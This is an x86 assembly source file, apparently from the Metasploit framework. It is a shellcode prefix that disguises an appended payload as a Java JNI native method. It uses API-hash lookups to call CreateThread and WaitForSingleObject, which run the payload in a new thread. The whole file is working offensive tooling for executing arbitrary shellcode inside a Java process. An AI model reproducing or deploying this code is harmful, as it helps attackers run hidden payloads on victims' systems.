;; Prefix to prepend to your shellcode to make it look like a normal Java native method.
;; This will create a native thread, execute the payload (EXITFUNC=thread) in it, and
;; wait for the thread to finish.

;; nasm -O3 -I path/to/msf3/ -o win32_shellcode-prefix.payload win32_shellcode-prefix.asm

;; private static native void shellcode();
;; JNIEXPORT void JNICALL Java_shellcode(JNIEnv *env, jclass clazz)

[BITS 32]
[ORG 0]

  push ebp               ; create stack frame
  mov ebp, esp           ; env = [ebp+8]
                         ; clazz = [ebp+12]
                         ; fd = [ebp+16]
  push ecx               ; tid = [ebp-4]

  cld                    ; Clear the direction flag.
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
%include "external/source/shellcode/windows/x86/src/block/block_api.asm"
start:                   ;
  pop esi                ; pop off the address of 'api_call' for calling later.

  lea eax, [ebp-4]       ; eax = createThread(NULL, 0, shellcode_start, 0, 0, &tid);
  push eax
  push 0
  push 0
  jmp collect_shellcode_address
shellcode_address_collected:
  push 0
  push 0
  push 0x160D6838        ; hash( "kernel32.dll", "CreateThread" )
  call esi

  push -1                ; WaitForSingleObject(eax, -1);
  push eax
  push 0x601D8708        ; hash( "kernel32.dll", "WaitForSingleObject" )
  call esi

  leave                  ; clean stack frame and return
  ret 12
collect_shellcode_address:
  call shellcode_address_collected
  ;; here comes our shellcode